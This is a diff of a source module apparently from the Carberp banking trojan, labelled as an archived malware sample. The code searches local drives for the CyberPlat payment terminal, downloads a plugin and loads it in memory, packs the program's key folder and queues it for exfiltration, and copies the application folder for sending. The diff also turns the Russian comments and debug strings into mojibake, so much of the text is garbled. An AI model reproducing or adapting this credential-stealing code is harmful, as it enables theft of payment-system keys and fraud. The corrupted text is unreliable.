@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #include <shlobj.h>
@@ -12,7 +23,7 @@
 
 
 
-//------------------------  Блок вынесен специально для Коли  -----------------------//
+//------------------------  пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ  -----------------------//
 #include "Sber.h"
 #include "Inject.h"
 
@@ -27,7 +38,7 @@ namespace CYBERPLATDBGTEMPLATES
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define CPDDBG CYBERPLATDBGTEMPLATES::DBGOutMessage<>
 
 
@@ -43,7 +54,7 @@ const static char CyberPlatDB[]   = {'c','y','b','e','r','t','e','r','m','.','m'
 //---------------------------------------------------------------------------
 PCHAR CyberPlatGetTempPath()
 {
-	// Функция возвращает путь для хранения временных файлов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char CBTempPath[] = {'c', 'p', 't', 'm', 'p',  0};
 
 	PCHAR Path = STR::Alloc(MAX_PATH);
@@ -58,9 +69,9 @@ PCHAR CyberPlatGetTempPath()
 
 PCHAR CyberPlatGetStotageFileName()
 {
-	// Функция возвращает полное имя файла
-	// где будут храниться данные об обработанных
-	// хранилищах
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
     const static char FileName[] = {'c', 'b', 'r', 'p', 'l', 's', 't', 'f', '0', '1', '.', 'd', 'a', 't',  0};
 
@@ -71,8 +82,8 @@ PCHAR CyberPlatGetStotageFileName()
 
 bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
 {
-	// Функция добавляет информацию об обработанном файле в базу.
-	// Вернёт истину если данный файл не обрабатывался
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(AppFileName))
 		return false;
 
@@ -82,7 +93,7 @@ bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
 	if (FileName == NULL)
 		return true;
 
-	// Проверяем есть ли данных хэш в базе
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	DWORD BufSize = 0;
 	PDWORD Buf = (PDWORD)File::ReadToBufferA(FileName, BufSize);
 	if (Buf != NULL)
@@ -99,7 +110,7 @@ bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
 		}
 	}
 
-	// В случае если включена только проверка, то прерываем обработки
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (OnlyCheckInBas)
 	{
 		if (Buf != NULL)
@@ -107,7 +118,7 @@ bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
 		return true;
     }
 
-	// Дописываем Хэш в базу
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	DWORD NewBufSize = sizeof(Hash) + BufSize;
 	PDWORD NewBuf = (PDWORD)MemAlloc(NewBufSize);
 	if (NewBuf == NULL) return true;
@@ -115,14 +126,14 @@ bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
 
 	*NewBuf = Hash;
 
-	// Добавляем старые данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Buf != NULL)
 	{
 		m_memcpy((LPBYTE)NewBuf + sizeof(Hash), Buf, BufSize);
 		MemFree(Buf);
 	}
 
-	// Сохраняем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	File::WriteBufferA(FileName, NewBuf, NewBufSize);
 
 	STR::Free(FileName);
@@ -135,8 +146,8 @@ bool CyberPlatAddFileToBase(PCHAR AppFileName, bool OnlyCheckInBas)
 
 void CyberPlatSendData(PCHAR Path, PCHAR AppName)
 {
-	// Функция отправки данных киберплата
-	CPDDBG("CyberPlatDLL", "Отправляем данные");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 	const static char SystemName[] = {'C', 'y', 'b', 'e', 'r', 'P', 'l', 'a', 't', 0};
 	const static char DirName[] = {'K', 'e', 'y', 's',  0};
@@ -149,7 +160,7 @@ void CyberPlatSendData(PCHAR Path, PCHAR AppName)
 	CloseCab(Handle);
 	if (DataGrabber::SendCabDelayed(NULL, CabName, (PCHAR)SystemName))
 	{
-        CPDDBG("CyberPlatDLL", "Данные добавлены в хранилище отправки");
+        CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
         CyberPlatAddFileToBase(AppName, false);
     }
     pDeleteFileA(CabName);
@@ -160,26 +171,26 @@ void CyberPlatSendData(PCHAR Path, PCHAR AppName)
 
 void CyberPlatCallPlugin(PCHAR WorkPath, PCHAR AppName)
 {
-	// Загрузить и выполнить плагин киберплата
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(WorkPath)) return;
 
-	CPDDBG("CyberPlatDLL", "Обрабатываем путь [%s]", WorkPath);
+	CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ [%s]", WorkPath);
 
 	const static char CyberPlatPlugin[] = {'c', 'y', 'b', 'e', 'r', 'p', 'l', 'a', 't', '.', 'p', 'l', 'u', 'g',  0};
 	const static char PluginProcName[] = {'P', 'r', 'o', 'c', '1',  0};
 
-	// Загружаем плагин
-    CPDDBG("CyberPlatDLL", "Загружаем плагин");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+    CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 	DWORD ModuleSize = 0;
 	LPVOID Module    = Plugin::Download((PCHAR)CyberPlatPlugin, NULL, &ModuleSize);
 
 	if (Module == NULL)
 	{
-        CPDDBG("CyberPlatDLL", "Плагин отсутствует");
+        CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		return;
 	}
-	CPDDBG("CyberPlatDLL", "плагин загружен");
-	// Загружаем библиотеку
+	CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     HMEMORYMODULE Handle = MemoryLoadLibrary(Module);
 
 	if (Handle != NULL)
@@ -188,10 +199,10 @@ void CyberPlatCallPlugin(PCHAR WorkPath, PCHAR AppName)
 
 		TMethod Method = (TMethod)MemoryGetProcAddress(Handle, (PCHAR)PluginProcName);
 
-		// Вызываем метод обработки базы киберплаьа
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Method != NULL)
 		{
-			CPDDBG("CyberPlatDLL", "Вызываем метод обработки");
+			CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			PCHAR TempPath = CyberPlatGetTempPath();
 			PCHAR DBFile   = STR::New(2, WorkPath, (PCHAR)CyberPlatDB);
 
@@ -215,14 +226,14 @@ void CyberPlatCallPlugin(PCHAR WorkPath, PCHAR AppName)
 
 void CyberPlatCheckDrive(PCHAR Drive, LPVOID Data, bool &Cancel)
 {
-	CPDDBG("CyberPlatDLL", "Проверяем диск %s", Drive);
-	// проверяем не установлена ли программа на диске
+	CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ %s", Drive);
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR FileName = STR::New(3, Drive, (PCHAR)CyberPlatPath, (PCHAR)CyberPlatApp);
 
 	if (FileExistsA(FileName))
 		if (CyberPlatAddFileToBase(FileName, true))
 		{
-			// Приложение найдено включаем обработку
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			Cancel = true;
 			PCHAR Path = STR::New(2, Drive, (PCHAR)CyberPlatPath);
 			CyberPlatCallPlugin(Path, FileName);
@@ -236,8 +247,8 @@ void CyberPlatCheckDrive(PCHAR Drive, LPVOID Data, bool &Cancel)
 
 DWORD WINAPI CyberPlatCheckDrives(LPVOID Data)
 {
-	// Процедура поиска инсталированной программы
-	CPDDBG("CyberPlatDLL", "Запускаем проверку дисков");
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	CPDDBG("CyberPlatDLL", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 	EnumDrives(DRIVE_FIXED, CyberPlatCheckDrive, NULL);
 	return 0;
 }
@@ -248,18 +259,18 @@ DWORD WINAPI CyberPlatCheckDrives(LPVOID Data)
 
 void CyberPlatCheckInstalled()
 {
-	//  функция запускает проверку
-	//  существования необходимой программы на всех локальных
-	//  дисках системы. Поиск осуществляется по пути который,
-	//  по умолчанию предлагает инсталятор программы
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	//  пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	StartThread(CyberPlatCheckDrives, NULL);
 }
 //---------------------------------------------------------------------------
 
 DWORD WINAPI CyberPlatHandleOwtherApplication(LPVOID Data)
 {
-	// Функция обрабатывает приложение которое не найдено
-	// в стандартных путях поиска
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Data == NULL)
 		return 0;
@@ -269,7 +280,7 @@ DWORD WINAPI CyberPlatHandleOwtherApplication(LPVOID Data)
 
 	if (Path != NULL)
 	{
-		// Запускаем плвагин на обработку
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		CyberPlatCallPlugin(Path, FileName);
     }
 
@@ -283,8 +294,8 @@ void StartSending(PCHAR ModulePath);
 DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData );
 bool CyberPlatCheckApplication(PCHAR AppName)
 {
-	// Функция проверяет запущенное приложение на предмет того, не
-	// является ли он необработанным приложением киберплата
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (STR::IsEmpty(AppName))
 		return false;
 	PCHAR FileName = File::ExtractFileNameA(AppName, false);
@@ -292,7 +303,7 @@ bool CyberPlatCheckApplication(PCHAR AppName)
 	if (Hash == HASH_CYBERTERM)
 		if (CyberPlatAddFileToBase(AppName, true))
 		{
-			// Нужное нам приложение
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			PCHAR FileNameDuplicate = STR::New(AppName);
 		//	StartSending(FileNameDuplicate);
 			StartThread(CyberPlatHandleOwtherApplication, FileNameDuplicate);
@@ -304,13 +315,13 @@ bool CyberPlatCheckApplication(PCHAR AppName)
 //---------------------------------------------------------------------------
 void StartSending(PCHAR ModulePathIn)
 {
-	CPDDBG("CyberPlatDLL","начнем.%s",ModulePathIn);
-	//пробуем создать файл, если он создан, тогда смотрим что в нутри, если путь к директории то шлем, иначе ничего не делаем
+	CPDDBG("CyberPlatDLL","пїЅпїЅпїЅпїЅпїЅпїЅ.%s",ModulePathIn);
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
 		pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cyb.tmp"), sTEMPProfile, MAX_PATH);
 		if(FileExistsA(sTEMPProfile))
 		{
-			CPDDBG("CyberPlatDLL","походу сбер уже запускался.%s",ModulePathIn);
+			CPDDBG("CyberPlatDLL","пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.%s",ModulePathIn);
 			DWORD size;
 			char* ModulePath=(PCHAR)File::ReadToBufferA(sTEMPProfile,size);
 			if(lstrcmp(ModulePath,"123")!=0 )
@@ -324,7 +335,7 @@ void StartSending(PCHAR ModulePathIn)
 		}
 		else
 		{
-			CPDDBG("CyberPlatDLL","пишем имя в файл, чтобы знать где стоит сбер.%s",ModulePathIn);
+			CPDDBG("CyberPlatDLL","пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.%s",ModulePathIn);
 			File::WriteBufferA(sTEMPProfile,ModulePathIn,STR::Length(ModulePathIn));
 			//MegaJump(CopyFolderAndSendThread);			
 			CopyFolderAndSendThread(NULL);
@@ -337,7 +348,7 @@ void StartSending(PCHAR ModulePathIn)
 DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData )
 {
 	
-	//Сначала копируем в темповую папку файлы, после чего их отправляем методом игоря вызываемым из длл
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ
 	PCHAR Name;//= STR::Alloc(MAX_PATH);
 
 	PCHAR sTEMPProfileSB = STR::Alloc(MAX_PATH );
@@ -356,35 +367,35 @@ DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData )
 		return 0;
 	}
 	
-	// откуда копируем
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	
 	CPDDBG("CyberPlatDLL","CopyFolderThread %s",Name);
 	pPathRemoveFileSpecA(Name);
 
-	// добавляем в конце два нулевых символа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int ii=m_lstrlen(Name);
 	Name[ii]='\0';
 	Name[ii+1]='\0';
 
-	// куда копируем
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR sTEMPProfile = STR::Alloc(MAX_PATH );
 	m_memset(sTEMPProfile,0,MAX_PATH);
 	pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cdat"), sTEMPProfile, MAX_PATH);
 	pCreateDirectoryA(sTEMPProfile,NULL);
 
-	// добавляем в конце два нулевых символа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int i=m_lstrlen(sTEMPProfile);
 	sTEMPProfile[i]='\0';
 	sTEMPProfile[i+1]='\0';
 	
-	// Само копирование
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool isSend=CopyFileANdFolder(Name,sTEMPProfile);
 	
 
 
 	#ifdef VideoRecorderH
-	//Отправка
-		CPDDBG("CyberPlatDLL","отправка пошла %s",sTEMPProfile);
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		CPDDBG("CyberPlatDLL","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s",sTEMPProfile);
 		//StartSendThread(sTEMPProfile,NULL,NULL,700);
 		//StartThread(StartSendinThread,sTEMPProfile);
 		//MegaJump(StartSendinThread);
@@ -392,7 +403,7 @@ DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData )
 	
 	if(isSend)
 	{
-		CPDDBG("CyberPlatDLL","мочим папку %s",sTEMPProfile);
+		CPDDBG("CyberPlatDLL","пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s",sTEMPProfile);
 		sTEMPProfile[i]='\0';
 		sTEMPProfile[i+1]='\0';
 		DeleteFolders(sTEMPProfile);
@@ -400,7 +411,7 @@ DWORD WINAPI CopyFolderAndSendThread( LPVOID lpData )
 		File::WriteBufferA(sTEMPProfile, (void *)"123",3);
 	}
 	else
-		CPDDBG("CyberPlatDLL","не мочим папку %s",sTEMPProfile);
+		CPDDBG("CyberPlatDLL","пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s",sTEMPProfile);
 
 
 	STR::Free(sTEMPProfileSB);
